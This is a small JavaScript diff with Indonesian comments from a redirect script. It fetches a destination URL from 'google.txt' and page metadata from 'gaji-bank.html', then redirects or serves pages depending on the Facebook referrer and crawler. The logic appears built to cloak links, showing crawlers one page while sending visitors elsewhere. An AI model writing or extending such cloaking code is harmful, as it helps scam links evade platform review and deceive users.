@@ -38,8 +38,8 @@
     fetchFileContent('/gaji-bank.html'), // Ambil metadata asli dari gaji-bank.html
   ])
     .then(([googleUrl, targetUrl, originalHtml]) => {
-      if (referrer.includes('facebook.com') && isFacebookCrawler && currentPath.includes('redirect.html')) {
-        // Jika redirect.html diakses dari referer Facebook dan crawler Facebook
+      if (currentPath.includes('redirect.html')) {
+        // Redirect selalu dilakukan jika berada di redirect.html
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
       } else if (currentPath.includes(targetUrl.trim()) && !referrer.includes('facebook.com')) {
         // Jika gaji-bank.html diakses langsung tanpa referer Facebook
